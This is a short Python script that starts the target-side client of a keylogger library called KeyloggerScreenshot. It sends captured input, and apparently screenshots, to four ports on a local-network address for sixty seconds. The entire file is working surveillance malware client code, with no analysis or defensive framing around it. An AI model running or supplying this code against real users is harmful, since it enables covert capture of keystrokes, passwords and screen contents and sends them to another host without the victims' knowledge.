import KeyloggerScreenshot as ks

ip = "192.168.0.74"
key_client = ks.KeyloggerTarget(ip, 1234, ip, 1235, ip, 1236,ip, 1237, duration_in_seconds=60)
key_client.start()
